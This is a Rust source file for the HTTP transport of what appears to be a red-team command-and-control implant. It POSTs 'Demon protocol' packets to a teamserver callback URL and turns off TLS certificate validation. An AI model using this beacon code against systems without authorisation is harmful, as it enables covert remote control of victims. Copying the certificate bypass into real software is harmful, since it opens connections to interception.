//! HTTP transport layer for communicating with the Red Cell teamserver.

use tracing::{debug, warn};

use crate::config::SpecterConfig;
use crate::error::SpecterError;

/// HTTP transport for sending Demon protocol packets to the teamserver.
#[derive(Debug)]
pub struct HttpTransport {
    client: reqwest::Client,
    callback_url: String,
}

impl HttpTransport {
    /// Create a new HTTP transport from the given agent configuration.
    pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
        let client = reqwest::Client::builder()
            .user_agent(&config.user_agent)
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| SpecterError::Transport(e.to_string()))?;

        Ok(Self { client, callback_url: config.callback_url.clone() })
    }

    /// Send raw packet bytes to the teamserver and return the response body.
    pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
        debug!(url = %self.callback_url, packet_len = packet.len(), "sending packet");

        let response = self
            .client
            .post(&self.callback_url)
            .body(packet.to_vec())
            .send()
            .await
            .map_err(|e| SpecterError::Transport(e.to_string()))?;

        let status = response.status();
        if !status.is_success() {
            warn!(status = %status, "teamserver returned non-success status");
            return Err(SpecterError::Transport(format!("teamserver returned HTTP {status}")));
        }

        let body = response.bytes().await.map_err(|e| SpecterError::Transport(e.to_string()))?;

        debug!(response_len = body.len(), "received response");
        Ok(body.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;

    #[test]
    fn transport_creation_succeeds_with_default_config() {
        let config = SpecterConfig::default();
        let transport = HttpTransport::new(&config);
        assert!(transport.is_ok());
    }
}
